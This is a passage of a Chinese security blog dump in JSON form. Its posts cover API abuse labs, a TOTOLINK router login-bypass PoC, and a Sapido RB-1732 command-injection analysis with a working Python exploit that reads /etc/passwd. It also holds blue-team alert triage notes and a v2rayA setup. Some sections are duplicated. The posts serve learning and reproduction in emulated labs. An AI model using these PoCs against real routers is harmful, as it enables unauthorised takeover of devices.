RQ5：GDBFuzz 从支配关系中获益多少？ 发现：在我们的实验中，优势关系将所需的断点中断减少了三分之二以上。 RQ6：GDBFuzz 在多大程度上帮助逆向工程工具揭示无法识别的控制流？ 发现：GDBFuzz 显示未检测到的基本块和边缘，以便在模糊测试期间进行逆向工程。 RQ7：可用断点数如何影响模糊测试性能？ 发现：随着时间推移，覆盖率呈指数级增长，需要的断点呈指数级增长 RQ8：GDBFuzz 与基于应用程序的设置上的黑盒模糊测试相比如何？ 发现：随着时间推移，覆盖率呈指数级增长，需要的断点呈指数级增长 RQ8：GDBFuzz 与基于应用程序的设置上的黑盒模糊测试相比如何？","categories":[{"name":"公众号推文","slug":"公众号推文","permalink":"http://example.com/categories/%E5%85%AC%E4%BC%97%E5%8F%B7%E6%8E%A8%E6%96%87/"}],"tags":[{"name":"公众号推文","slug":"公众号推文","permalink":"http://example.com/tags/%E5%85%AC%E4%BC%97%E5%8F%B7%E6%8E%A8%E6%96%87/"},{"name":"二进制安全","slug":"二进制安全","permalink":"http://example.com/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/"}],"author":"SecureNexusLab"},{"title":"针对API漏洞挖掘技巧学习","slug":"vuln-mining-skills-for-api","date":"2024-07-09T01:03:00.000Z","updated":"2025-07-15T09:16:20.494Z","comments":true,"path":"2024/07/09/vuln-mining-skills-for-api/","permalink":"http://example.com/2024/07/09/vuln-mining-skills-for-api/","excerpt":"","text":"前言首先我们需要了解API基本的一些知识，我们首先来看几个GET方式的API 12GET /api/books HTTP/1.1Host: example.com 首先上面这种，是api的端点，也就是请求点，通过交互获得图书馆的图书列表，例如另一个端点可能是/api/books/mystery，那么这个可能可以检索书籍列表。 一旦确认了端点，就需要确定怎么样可以和他们产生交互，也就是触发检索。 API文档api一半都会有相对应的文档，以便开发人员去使用，通常是公开可用的，但是也有不公开的，我们也可以使用api的程序来访问。例如： 123- /api- /swagger/index.html- /openapi.json 如果标识了资源终结点，需要调查一下基本路劲，比如：表示了终结点&#x2F;api&#x2F;swagger&#x2F;v1&#x2F;users&#x2F;123，就需要调查以下路径 123- /api/swagger/v1- /api/swagger- /api 靶场一、使用文档利用API端点我们想要完成这个靶场，需要知道几点： 什么是API文档，API文档对攻击者如何使用，如何发现API文档 这里我是用插件findsomething找到页面中的api 访问之后提示我们缺少参数，我们往上一级目录，也就是api目录访问看看 发现了说明文档 我们直接点delete就可以直接对指定用户进行删除，但是这里回显是401权限不足，根据靶场提供的信息我们wiener用户，再次访问即可删除。当然，我们也可以通过抓包，去查看这个api的使用参数，仿照发送请求，达到任意控制效果 常见支持HTTP的方法 GET - Retrieves data from a resource.GET -从资源中检索数据。 PATCH - Applies partial changes to a resource.PATCH -删除对资源的部分更改。 OPTIONS - Retrieves information on the types of request methods that can be used on a resource.OPTIONS -检索有关可在资源上使用的请求方法类型的信息。 研究api端点时，测试方法很重要，比如我们知道端点&#x2F;api&#x2F;tasks，我们可以尝试以下方法 GET &#x2F;api&#x2F;tasks - Retrieves a list of tasks.GET &#x2F;api&#x2F;tasks -检索任务列表。 POST &#x2F;api&#x2F;tasks - Creates a new task.POST &#x2F;api&#x2F;tasks -创建一个新任务。 DELETE &#x2F;api&#x2F;tasks&#x2F;1 - Deletes a task.DELETE &#x2F;api&#x2F;tasks&#x2F;1 -完成任务。 靶场二、查找利用未使用的API端点该靶场，首先我们需要找到未被使用的api端点，上面一个靶场我们是找不到的，这里根据靶场提示，我们挨个点击靶场中购买，走一遍购买流程，我们可以在数据记录中，找到一个隐藏的api 这个是我们在提交购买的时候产生的，我们将这个发送到重放器中 尝试使用不同的方式进行排查，比如我们可以尝试使用&#x2F;api&#x2F;products&#x2F;1，或者&#x2F;api&#x2F;products、&#x2F;api来排查所有的内容，但是这里均无法响应 那么下一步我们可以尝试不同的方式 比如我这里使用post 这里提示不支持该方法，并且告诉了我可用的方法，这里我们试试 提示内部服务错误，我们在下面加上括号 提示我们缺少price参数 加上参数 提示必须是非负整数，我们去掉引号试试 提示我们需要Content-Type: application/json 我们复制放到下面 这里成功修改了价格，我们将价格修改为0元，购买即可通关。 本关卡以api传递参数的方式，让我们成功修改了参数。 识别隐藏参数我们通常可以看到，一个api请求，他会允许我们修改某些东西 PATCH &#x2F;api&#x2F;users&#x2F;请求它允许用户更新他们的用户名和电子邮件，并包含以下JSON： 1&#123;&quot;username&quot;: &quot;wiener&quot;, &quot;email&quot;: &quot;wiener@example.com&quot;, &#125; 返回的信息是以下JSON 1&#123;&quot;id&quot;: 123, &quot;name&quot;: &quot;John Doe&quot;, &quot;email&quot;: &quot;john@example.com&quot;, &quot;isAdmin&quot;: &quot;false&quot; &#125; 这表示隐藏的id和参数，可能可以进行改变使用 我们想要测试上面的isadmin参数，可以将上面的参数修改后发送到PATCH请求 1&#123;&quot;username&quot;: &quot;wiener&quot;, &quot;email&quot;: &quot;wiener@example.com&quot;, &quot;isAdmin&quot;: false, &#125; 如果我们将false修改为true，那么在没有充分验证的情况下，有可能会错误绑定对象，获取权限。 靶场三、利用批量分配漏洞该靶场，我们需要分析一下，流量包中的api，根据提示，我们在购买的过程中，找到两个api的包 一个get一个post两个数据包，这里我们可以在post数据包中看到一个数据结构 在GET数据包中，可以在返回包中发现一些隐藏的数据传递方式 我们可以尝试拼接到post数据包中进行尝试 这里报错提示我们资金不足， 我们尝试改变内容 尝试数据改成100，直接通关了 返回true，完成了关卡 该靶场的问题，在于，我们可以从GET中获取到一些隐藏的参数，在得到隐藏参数之后，我们可以通过post或者其他的方法进行发送，尝试执行。","categories":[{"name":"公众号推文","slug":"公众号推文","permalink":"http://example.com/categories/%E5%85%AC%E4%BC%97%E5%8F%B7%E6%8E%A8%E6%96%87/"}],"tags":[{"name":"公众号推文","slug":"公众号推文","permalink":"http://example.com/tags/%E5%85%AC%E4%BC%97%E5%8F%B7%E6%8E%A8%E6%96%87/"},{"name":"Web安全","slug":"Web安全","permalink":"http://example.com/tags/Web%E5%AE%89%E5%85%A8/"}]},{"title":"物联网学习——totolink登陆绕过漏洞","slug":"iot-totolink-sign-in-vuln","date":"2024-06-15T02:57:00.000Z","updated":"2025-07-15T08:37:31.521Z","comments":true,"path":"2024/06/15/iot-totolink-sign-in-vuln/","permalink":"http://example.com/2024/06/15/iot-totolink-sign-in-vuln/","excerpt":"","text":"漏洞描述TOTOLINK NR1800X V9.1.0u.6279_B20210910包含登录绕过漏洞，由于对topicurl的值进行处理，来实现不同函数接口的调用，其中对authCode鉴别存在缺陷，导致可以构造URL实现默认登录。 漏洞类型：登录绕过漏洞 影响范围：totolink nr1800x 9.1.0u.6279_b20210910版本 修复版本：高于9.1.0u.6279_b20210910。 复现环境固件下载地址： https://www.totolink.net/home/menu/detail/menu_listtpl/download/id/225/ids/36.html 固件信息：NR1800X_Firmware V9.1.0u.6279_B20210910 解压后使用binwalk提取.web文件中的文件系统 1binwalk -Me TOTOLINK_C834FR-1C_NR1800X_IP04469_MT7621A_SPI_16M256M_V9.1.0u.6279_B20210910_ALL.web 模拟启动先在操作系统中(ubuntu18.04)安装好qemu和其他工具。 12345sudo apt-get install qemusudo apt-get install qemu-user-staticsudo apt-get install qemu-systemsudo apt-get install uml-utilitiessudo apt-get install bridge-utils 安装完成之后，修改ubuntu系统主机的网络配置 详细的网络配置请参考： https://blog.csdn.net/QQ1084283172/article/details/69378333 如果找不到br0，注意查看以下命令是否正常运行。 12sudo ifdown ens32sudo ifup br0 下载qemu需要用到的镜像和其他文件。下载地址： https://people.debian.org/~aurel32/qemu/mips/ 将下载的文件都存放在在一个目录中，方便使用命令启动。然后启动qemu虚拟机。qemu虚拟机默认账密root:root 1sudo qemu-system-mipsel -M malta -kernel mipsel-vmlinux-3.2.0-4-4kc-malta -hda debian_wheezy_mipsel_standard.qcow2 -append &quot;root=/dev/sda1 console=tty0&quot; -net nic -net tap,ifname=tap0,script=no,downscript=no -nographic 虚拟机启动之后ifconfig查看ip地址，如果没有IP地址信息，需要手动进行设置 qemu虚拟机： 1ifconfig eth0 192.168.102.200 netmask 255.255.255.0 ubuntu系统主机： 1sudo ifconfig tap0 192.168.102.199 netmask 255.255.255.0 设置好IP之后，可以用ifconfig命令再次查看，然后使用ping 测试两台主机的通信。 将提取到的固件打包成tar文件，然后使用scp命令传到qemu虚拟机中 拷贝系统文件： 123456scp -r squashfs-root.tar root@192.1.1.200:/root/chmod -R 777 squashfs-rootmount -o bind /dev ./squashfs-root/dev/mount -t proc /proc ./squashfs-root/proc/chroot ./squashfs-root/ sh 我们还需要调起服务 1./usr/sbin/lighttpd -f ./lighttp/lighttpd.conf 访问目标网页 漏洞分析首先查看登录时的数据包，有两个关键数据包 第一个是登录的POST数据包 漏洞分析首先查看登录时的数据包，有两个关键数据包第一个是登录的POST数据包 第二个是登录失败跳转的数据包 使用IDA打开/cgi-bin/cstecgi.cgi文件，搜索action=login 查看逆向后的代码 格式化处理URL是为了便于后续数据的传递，如下图： 接下来要调用相应函数 接下来寻找目标有点麻烦，我们需要再搜索一下formLoginAuth.htm字符，进而跳转到sub_42AEEC函数中 函数中包含对用户名和密码输入的获取处理，以及构造redirectURL的过程，其中有个关键词”authCode” 我们还要对lighttpd文件进行逆向，并搜索authCode，发下如下代码，其中依次获取了参数值 而后续对v7的处理上 仅仅判断了v7是否存在就可以直接获取session_id，这也是漏洞发生的根本原因 漏洞复现构造PoC： 1http://192.168.102.200/formLoginAuth.htm?authCode=1&amp;userName=admin&amp;goURL=home.html&amp;action=login 原始流量数据包： 123456789GET /formLoginAuth.htm?authCode=1&amp;userName=admin&amp;goURL=home.html&amp;action=login HTTP/1.1Host: 192.168.102.200User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:73.0) Gecko/20100101 Firefox/73.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflateConnection: keep-aliveCookie: SESSION_ID=2:1711291127:2Upgrade-Insecure-Requests: 1 虽然相应包是302，但后续的数据包表明，重定向到了&#x2F;basic&#x2F;index.html中 Wireshark截图：","categories":[{"name":"公众号推文","slug":"公众号推文","permalink":"http://example.com/categories/%E5%85%AC%E4%BC%97%E5%8F%B7%E6%8E%A8%E6%96%87/"}],"tags":[{"name":"公众号推文","slug":"公众号推文","permalink":"http://example.com/tags/%E5%85%AC%E4%BC%97%E5%8F%B7%E6%8E%A8%E6%96%87/"},{"name":"二进制安全","slug":"二进制安全","permalink":"http://example.com/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/"}],"author":"SecureNexusLab"},{"title":"物联网安全篇——SapidoRB-1732路由器命令执行漏洞","slug":"SapidoRB-1732-RCE","date":"2024-05-04T12:19:00.000Z","updated":"2025-07-15T08:20:38.143Z","comments":true,"path":"2024/05/04/SapidoRB-1732-RCE/","permalink":"http://example.com/2024/05/04/SapidoRB-1732-RCE/","excerpt":"","text":"Sapido RB-1732路由器命令执行漏洞复现0x01 漏洞介绍Sapido 是 SAPIDO 公司开发的一款家用路由器，其 RB-1732 系列 v2.0.43 之前的固件版本存在一处命令执行漏洞。所谓命令执行漏洞，是指服务器没有对执行的命令进行过滤，导致用户可以执行任意的系统命令。命令执行漏洞属于高危的漏洞。该漏洞产生的原因是，服务器的 syscmd.asp 页面没有对传递过来的参数进行过滤，这使得用户以参数的形式将系统命令发送给服务器，并在服务器上执行。 0x02 漏洞分析固件获取本次分析使用的固件版本为：RB-1732_TC_v2.0.43 固件下载地址： 1百度云：https://pan.baidu.com/s/1Gj9RDlAQdCDiaLdLzQ2Aag?pwd=8381 1微云：https://share.weiyun.com/RjicYRKE 环境配置本次分析使用的环境是AttifyOS，一个专门用于物联网渗透测试和分析的镜像，里边预装了许多工具，省去了自己部署环境的时间和精力。可通过Github仓库里的下载链接下载。 漏洞分析将下载得到的固件放入虚拟机中，使用 binwalk 提取文件系统 可以看到，该固件使用的是 SquashFS 文件系统，也是使用相对比较多的一种文件系统。 在漏洞介绍中，我们提到，这个系列的路由器漏洞存在命令执行漏洞，原因出在这个 syscmd.asp 页面上。所以，我们先用 find 命令找到 syscmd.asp 文件的位置。 12iot@attifyos ~/D/f/_/squashfs-root&gt; find ./ -name &quot;syscmd.asp&quot;./web/syscmd.asp 可以发现，syscmd.asp 文件位于 web 目录下，我们进入该目录，打开 syscmd.asp 文件进行分析。查看该文件的源码如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657&lt;html&gt;&lt;! Copyright (c) Realtek Semiconductor Corp., 2003. All Rights Reserved. -&gt;&lt;head&gt;&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html&quot;&gt;&lt;title&gt;System Command&lt;/title&gt;&lt;script&gt;function saveClick()&#123; field = document.formSysCmd.sysCmd ; if(field.value.indexOf(&quot;ping&quot;)==0 &amp;&amp; field.value.indexOf(&quot;-c&quot;) &lt; 0)&#123; alert(&#x27;please add &quot;-c num&quot; to ping command&#x27;); return false; &#125; if(field.value == &quot;&quot;)&#123; alert(&quot;Command can&#x27;t be empty&quot;); field.value = field.defaultValue; field.focus(); return false ; &#125; return true;&#125;&lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;blockquote&gt;&lt;h2&gt;&lt;font color=&quot;#0000FF&quot;&gt;System Command&lt;/font&gt;&lt;/h2&gt;&lt;form action=/goform/formSysCmd method=POST name=&quot;formSysCmd&quot;&gt;&lt;table border=0 width=&quot;500&quot; cellspacing=0 cellpadding=0&gt; &lt;tr&gt;&lt;font size=2&gt; This page can be used to run target system command. &lt;/tr&gt; &lt;tr&gt;&lt;hr size=1 noshade align=top&gt;&lt;/tr&gt; &lt;tr&gt; &lt;td&gt;System Command: &lt;/td&gt; &lt;td&gt;&lt;input type=&quot;text&quot; name=&quot;sysCmd&quot; value=&quot;&quot; size=&quot;20&quot; maxlength=&quot;50&quot;&gt;&lt;/td&gt; &lt;td&gt; &lt;input type=&quot;submit&quot; value=&quot;Apply&quot; name=&quot;apply&quot; onClick=&#x27;return saveClick()&#x27;&gt;&lt;/td&gt; &lt;/tr&gt;&lt;/table&gt; &lt;input type=&quot;hidden&quot; value=&quot;/syscmd.asp&quot; name=&quot;submit-url&quot;&gt;&lt;/form&gt; &lt;script language=&quot;JavaScript&quot;&gt; &lt;/script&gt; &lt;textarea rows=&quot;15&quot; name=&quot;msg&quot; cols=&quot;80&quot; wrap=&quot;virtual&quot;&gt;&lt;% sysCmdLog(); %&gt;&lt;/textarea&gt; &lt;p&gt; &lt;input type=&quot;button&quot; value=&quot;Refresh&quot; name=&quot;refresh&quot; onClick=&quot;javascript: window.location.reload()&quot;&gt; &lt;input type=&quot;button&quot; value=&quot;Close&quot; name=&quot;close&quot; onClick=&quot;javascript: window.close()&quot;&gt;&lt;/p&gt;&lt;/blockquote&gt;&lt;/font&gt;&lt;/body&gt;&lt;/html&gt; 我们可以看到第29行处，form 表单中的 action 指向了 /goform/formSysCmd。第37行处的 input 框的 name 属性为 sysCmd，这个在后边我们会看到他的作用，他其实就是传递我们发送的命令的参数名字。接着我们跟进 formSysCmd 文件，看看他对我们表单提交的数据如何处理。使用 grep 命令全局搜索 formSysCmd 字符串： 12345678iot@attifyos ~/D/f/_/squashfs-root&gt; grep -r &quot;formSysCmd&quot;Binary file bin/webs matchesweb/obama.asp: field = document.formSysCmd.sysCmd ;web/obama.asp:&lt;form action=/goform/formSysCmd method=POST name=&quot;formSysCmd&quot;&gt;web/obama.asp: &lt;form method=&quot;post&quot; action=&quot;goform/formSysCmd&quot; enctype=&quot;multipart/form-data&quot; name=&quot;writefile&quot;&gt;web/obama.asp: &lt;form action=&quot;/goform/formSysCmd&quot; method=POST name=&quot;readfile&quot;&gt;web/syscmd.asp: field = document.formSysCmd.sysCmd ;web/syscmd.asp:&lt;form action=/goform/formSysCmd method=POST name=&quot;formSysCmd&quot;&gt; 可以看到，除了 syscmd.asp 和 obama.asp 这两个页面程序，只有一个结果显示是包含在二进制应用程序 bin&#x2F;webs 中，可以初步推测 webs 程序是真正的后台处理程序。使用 file 查看下该文件： 12iot@attifyos ~/D/f/_/squashfs-root&gt; file bin/websbin/webs: ELF 32-bit MSB executable, MIPS, MIPS-I version 1 (SYSV), dynamically linked, interpreter /lib/ld-, corrupted section header size 可以看到，是 mips 架构 32 位程序。 我们把 webs 导入到IDA中进行静态分析，保持默认选项不动，点击 OK 。 在上方菜单栏，依次点击 view -&gt; open subviews -&gt; Strings 查看全部字符串，使用 ctrl+F 快捷键搜索 formSysCmd 字符串。 可以看到有两个位置存在该字符串，分别位于 0x004044DB 和 0x00471A44 这两个位置，我们依次查看。首先是 0x004044DB 位置，双击进入反汇编窗口后，如下所示： 再次双击红框处的 formSysCmd字符串，跳转到 formSysCmd 函数的真实位置。 （采用同样的方法我们查看 0x00471A44 位置处的字符串，可以看到两个地址上的内容相同。） 使用 F5 快捷键进行反编译查看 formSysCmd 函数的伪代码，如下： 123456789101112131415161718192021222324252627282930313233int __fastcall formSysCmd(int a1)&#123; int Var; // $s4 _BYTE *v3; // $s1 _BYTE *v4; // $s5 int v5; // $s6 const char *v6; // $s3 _BYTE *v7; // $s7 int v8; // $v0 _DWORD *v9; // $s0 int v10; // $a0 const char *v11; // $a1 int v12; // $v0 int v13; // $s1 void (__fastcall *v14)(int, _DWORD *); // $t9 _BYTE *v15; // $a0 _BYTE *v16; // $a3 int v17; // $a0 int v18; // $v0 char v20[104]; // [sp+20h] [-68h] BYREF Var = websGetVar(a1, &quot;submit-url&quot;, &amp;dword_47F498); v3 = (_BYTE *)websGetVar(a1, &quot;sysCmd&quot;, &amp;dword_47F498); v4 = (_BYTE *)websGetVar(a1, &quot;writeData&quot;, &amp;dword_47F498); v5 = websGetVar(a1, &quot;filename&quot;, &amp;dword_47F498); v6 = (const char *)websGetVar(a1, &quot;fpath&quot;, &amp;dword_47F498); v7 = (_BYTE *)websGetVar(a1, &quot;readfile&quot;, &amp;dword_47F498); if ( *v3 ) &#123; snprintf(v20, 100, &quot;%s 2&gt;&amp;1 &gt; %s&quot;, v3); system(v20); &#125;······ 可以看到，在23行处，v3 变量通过 websGetVar 函数获取sysCmd传递过来的内容。还记得吗？刚才提到过 sysCmd 这个字符串，他是 input 框的 name 属性的值。然后接下来，在 if 处，使用 snprintf函数将得到的结果进行拼接并赋值给 v20 变量。紧接着就调用 system 函数执行 v20 里边的内容。注意到，这里并没有对 v20 变量的内容做任何过滤，所以就是这里导致了命令执行漏洞。 Ps：这里有一个奇怪的地方就是，我用IDA反编译出来的 snprintf 函数参数列表里最后只有 v3 变量，而网上的博客里反编译出来的伪代码中，在 v3 之后还有一个 “&#x2F;tmp&#x2F;syscmd.log” 字符串，比较奇怪，不过影响不是特别大。我又尝试了使用Ghidra来反编译，如下图所示，可以看到Ghidra反编译出来，snprintf 函数参数列表最后是有字符串的，还是Ghidra对MIPS架构支持的比较好，当然也可能是我IDA没有额外装mips插件的原因。 再次双击红框处的 formSysCmd字符串，跳转到 formSysCmd 函数的真实位置。 （采用同样的方法我们查看 0x00471A44 位置处的字符串，可以看到两个地址上的内容相同。） 使用 F5 快捷键进行反编译查看 formSysCmd 函数的伪代码，如下： 123456789101112131415161718192021222324252627282930313233int __fastcall formSysCmd(int a1)&#123; int Var; // $s4 _BYTE *v3; // $s1 _BYTE *v4; // $s5 int v5; // $s6 const char *v6; // $s3 _BYTE *v7; // $s7 int v8; // $v0 _DWORD *v9; // $s0 int v10; // $a0 const char *v11; // $a1 int v12; // $v0 int v13; // $s1 void (__fastcall *v14)(int, _DWORD *); // $t9 _BYTE *v15; // $a0 _BYTE *v16; // $a3 int v17; // $a0 int v18; // $v0 char v20[104]; // [sp+20h] [-68h] BYREF Var = websGetVar(a1, &quot;submit-url&quot;, &amp;dword_47F498); v3 = (_BYTE *)websGetVar(a1, &quot;sysCmd&quot;, &amp;dword_47F498); v4 = (_BYTE *)websGetVar(a1, &quot;writeData&quot;, &amp;dword_47F498); v5 = websGetVar(a1, &quot;filename&quot;, &amp;dword_47F498); v6 = (const char *)websGetVar(a1, &quot;fpath&quot;, &amp;dword_47F498); v7 = (_BYTE *)websGetVar(a1, &quot;readfile&quot;, &amp;dword_47F498); if ( *v3 ) &#123; snprintf(v20, 100, &quot;%s 2&gt;&amp;1 &gt; %s&quot;, v3); system(v20); &#125;······ 可以看到，在23行处，v3 变量通过 websGetVar 函数获取sysCmd传递过来的内容。还记得吗？刚才提到过 sysCmd 这个字符串，他是 input 框的 name 属性的值。然后接下来，在 if 处，使用 snprintf函数将得到的结果进行拼接并赋值给 v20 变量。紧接着就调用 system 函数执行 v20 里边的内容。注意到，这里并没有对 v20 变量的内容做任何过滤，所以就是这里导致了命令执行漏洞。 Ps：这里有一个奇怪的地方就是，我用IDA反编译出来的 snprintf 函数参数列表里最后只有 v3 变量，而网上的博客里反编译出来的伪代码中，在 v3 之后还有一个 “&#x2F;tmp&#x2F;syscmd.log” 字符串，比较奇怪，不过影响不是特别大。我又尝试了使用Ghidra来反编译，如下图所示，可以看到Ghidra反编译出来，snprintf 函数参数列表最后是有字符串的，还是Ghidra对MIPS架构支持的比较好，当然也可能是我IDA没有额外装mips插件的原因。 FAT在启动之后，会自动配置QEMU虚拟机以及网络环境，如上图，我们可以看到倒数第三行，bro 虚拟网卡的网络地址为 192.168.1.1 。我们按下ENTER键，稍等片刻，当看到下图所示内容时就表示环境已经部署好了。 此时，我们在浏览器中访问 192.168.1.1 这个地址后，会自动跳转到 /admin.asp ，显示路由器的管理页面 默认账号密码为 admin：admin，我们输入账号密码登录后，页面显示如下： 接下来，我们访问有漏洞的页面 /syscmd.asp ，如下图所示： 看到这个页面，再看我们之前看到的 syscmd.asp 的源码就容易理解多了。我们在 input 框输入命令 cat /etc/passwd 可以看到，命令成功执行。 我们可以抓包来看一下 可以看到 sysCmd 参数就是传递我们命令的参数，从第一行也可以看到，真正执行命令的后台程序为 /goform/formSysCmd 。感觉也是为我们分析漏洞多了一种思路。 我们也可以通过exploit脚本来攻击该漏洞： 1234567891011121314#rb1732_exploit.pyimport requestsimport sysdef test_httpcommand(ip, command): my_data = &#123;&#x27;sysCmd&#x27;: command, &#x27;apply&#x27;:&#x27;Apply&#x27;, &#x27;submit-url&#x27;:&#x27;/syscmd.asp&#x27;, &#x27;msg&#x27;:&#x27;&#x27;&#125; r = requests.post(&#x27;http://%s/goform/formSysCmd&#x27; % ip, data = my_data) content = r.text content = content[ content.find(&#x27;textarea row=&quot;15&quot; name=&quot;msg&quot; cols=&quot;80&quot; wrap=&quot;virtual&quot;&gt;&#x27;)+56:content.rfind(&#x27;&lt;/textarea&gt;&#x27;) ] return contentprint test_httpcommand(sys.argv[1],&quot; &quot;.join(sys.argv[2:])) 执行结果如下： 123456iot@attifyos ~/D/firmware&gt; python rb1732_exploir.py 192.168.1.1 &quot;cat /etc/passwd&quot;root:x:0:0:root:/:/bin/shnobody:x:0:0:nobody:/:/dev/nullftp:x:501:501::/var/home/anonymous:/dev/nullftpuser:x:502:502::/var/home:/dev/nulladmin:x:503:503::/home:/dev/null 0x04 参考链接http://www.mchz.com.cn/cn/service/Safety-Lab/info_26_itemid_6142.html","categories":[{"name":"公众号推文","slug":"公众号推文","permalink":"http://example.com/categories/%E5%85%AC%E4%BC%97%E5%8F%B7%E6%8E%A8%E6%96%87/"}],"tags":[{"name":"公众号推文","slug":"公众号推文","permalink":"http://example.com/tags/%E5%85%AC%E4%BC%97%E5%8F%B7%E6%8E%A8%E6%96%87/"},{"name":"二进制安全","slug":"二进制安全","permalink":"http://example.com/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/"}],"author":"SecureNexusLab"},{"title":"2024护网经验学习","slug":"hvv-experience-learning-2024-1","date":"2024-05-04T12:19:00.000Z","updated":"2025-07-15T08:01:47.372Z","comments":true,"path":"2024/05/04/hvv-experience-learning-2024-1/","permalink":"http://example.com/2024/05/04/hvv-experience-learning-2024-1/","excerpt":"","text":"01 暴力破解：基本特征就是短时间内大量的登录请求包括SMB邮件 ftp sslvpn rdp ssh telnet mysql协议等 误报排除方法：查看时间，是否为连续时间有大量的访问日志或者暴力破解安全日志，并确认是否每次暴力破解安全日志之间的间隔相似 短时间内发起了大量的请求，一般不会是误报，需要去相应终端尽行排查 到终端上查看登录日志，是否存在大量的登录失败日志 Windows: rdp/smb都可以在事件查看器中找4625的登录信息事件 Linux: 除root之外，是否还有其它特权用户(uid 为0) awk -F: ‘$3==0&#123;print $1&#125;’ /etc/passwd 可以远程登录的帐号信息 awk ‘/$1|$6/&#123;print $1&#125;’ /etc/shadow 统计登录失败日志 grep -o “Failed password” /var/log/secure|uniq -c 02 Web路径探测：疑IP或者内网主句在较短时间内请求了目的系统较多的web目录 误报排除方法：如果短时间内扫描大量不存在的web页面（人工达不到的速度，比如上面一分多钟达到208次）那就很有可能是在探 测web目录是否存在一些中间件 查看扫描的部分路径是否一些常见中间件的url，比如上面一直扫描web是否存在mysql的管理工具，如果扫描到 mysql管理工具可能利用工具存在漏洞进行渗透，那就不是误报，或者扫描一些webshell路径是否存在的时候会扫描 一些奇奇怪怪的不存在的页面，比如xx.php/db.php/shell.php等。扫描路径一般带有一些规律的， 可以分为以下几类：数据库管理页面（phpmyadmin，adminer等）、后台管理页面（manage.php , admin.php 等）、文本编辑器特定路径（ewebeditor,ueditor）、部分webshell地址(shell.php) 如果路径里面都是一些普通的html页面、客户自己的业务页面则为误报，比如扫描很多index.php index.html default.php等,这种场景一般是客户自己一些正常业务发出的大量请求 03 Webshell上传：检测webshell上传，在提交的请求中有webshell特征的文件或者一句话木马字段。可以网上检索到webshell 误报排除方法：若查看到日志，为乱码（实际为二进制无法读取）可判断为误报若SIP提示的链接下载的webshell文件为正常文件也可判断为误报 如果自己拿不准的话，将样本的md5或者样本上传到virustotal或者微步云沙箱进行检查webshell一般不会重复上传，查看到多条日志，提交的数据包都是相同的webshell文件，可以判断是否为客户的业务行为，为误报。如下图，所有的日志都是相同的，判断为客户业务行为 若为复杂的代码格式, 含有eval等危险函数, 各种编码转换和加密字符串的，基本为正报 对于编码的webshell，需要进行解码查看,Accept-Charset字段值进行base64解码，解码结果包含syetem()、echo()、certutil.exe等敏感关键字，且不涉及业务内容，判断为真实漏洞探测行为 04 Sql注入攻击：Sql注入通过判断web请求提交的字段中是否有数据库查询语句或者关键词进行判断 误报排除方法：查看日志，是否存在数据库查询的关键字，如select，where，union，等，并判断提交的语句是否为客户业务请求不规范所导致 通过返回包判断是否攻击成功，若判断为攻击行为，但是无返回包，判断为攻击不成功 05 XSS攻击：看日志中是否存在或类似的变形的字符串，这类是属于探测类攻击看日志中是否存在外部url地址，这些地址可能是用于接收管理员信息的第三方平台 误报排除方法：如果出现大量xss攻击日志，但日志内容格式都是一样的，没有明显变化，则可能是误判 如果攻击日志为json类数据，需和客户确认是否是正常业务，如果是正常业务，则为误判","categories":[{"name":"公众号推文","slug":"公众号推文","permalink":"http://example.com/categories/%E5%85%AC%E4%BC%97%E5%8F%B7%E6%8E%A8%E6%96%87/"}],"tags":[{"name":"公众号推文","slug":"公众号推文","permalink":"http://example.com/tags/%E5%85%AC%E4%BC%97%E5%8F%B7%E6%8E%A8%E6%96%87/"},{"name":"Web安全","slug":"Web安全","permalink":"http://example.com/tags/Web%E5%AE%89%E5%85%A8/"},{"name":"护网","slug":"护网","permalink":"http://example.com/tags/%E6%8A%A4%E7%BD%91/"}],"author":"SecureNexusLab"},{"title":"kali Linux配置那啥上网（懂得都懂）","slug":"kalilinux-configure-vpn","date":"2024-04-22T08:46:00.000Z","updated":"2025-07-15T07:38:54.683Z","comments":true,"path":"2024/04/22/kalilinux-configure-vpn/","permalink":"http://example.com/2024/04/22/kalilinux-configure-vpn/","excerpt":"","text":"前言 首先来看看废话，本次实验是在kali中安装，当然我们在Windows也可以使用v2 安装添加公钥 1wget -qO - https://apt.v2raya.org/key/public-key.asc | sudo tee /etc/apt/keyrings/v2raya.asc 第二步： 1echo &quot;deb [signed-by=/etc/apt/keyrings/v2raya.asc] https://apt.v2raya.org/ v2raya main&quot; | sudo tee /etc/apt/sources.list.d/v2raya.list 第三步： 1sudo apt update 第四步： 1sudo apt install v2raya v2ray 到这里就完成了。 以上四步大家按照顺序依次执行命令。 使用v2属于一个网页端，我们首先需要启动 1sudo systemctl start v2raya.service 启动之后我们可以直接使用网页端，访问： 1127.0.0.1:2017 我们访问之后，会有一个需要创建管理员 创建账号 这里我们自己去创建一个就可以了，然后回提示我们导入，这里大家就自行购买 我们可以购买订阅，也可以单独导入一个jd，我这里是购买了订阅地址， 1我们可以购买订阅，也可以单独导入一个jd，我这里是购买了订阅地址， 这里可以更新订阅， 这里可以选择我们一个，然后到右上角就绪点击一下 这里会变成正在运行，然后我们就可以快乐的看了。 最后经常用的记得开一下开机自启 1systemctl enable v2raya.service","categories":[{"name":"公众号推文","slug":"公众号推文","permalink":"http://example.com/categories/%E5%85%AC%E4%BC%97%E5%8F%B7%E6%8E%A8%E6%96%87/"}],"tags":[{"name":"公众号推文","slug":"公众号推文","permalink":"http://example.com/tags/%E5%85%AC%E4%BC%97%E5%8F%B7%E6%8E%A8%E6%96%87/"}],"author":"【白】"},{"title":"SRC易挖点之——并发漏洞利用方式","slug":"bai-src-vuln-exploit","date":"2024-04-09T05:33:00.000Z","updated":"2025-07-15T07:26:57.852Z","comments":true,"path":"2024/04/09/bai-src-vuln-exploit/","permalink":"http://example.com/2024/04/09/bai-src-vuln-exploit/","excerpt":"","text":"安装 安装方式有两种，一种直接在burp的插件商店中下载，但是需要burp比较新的版本才能在商店下载插件。 第二个方式直接在github上面下载 链接：https://github.com/portswigger/turbo-intruder 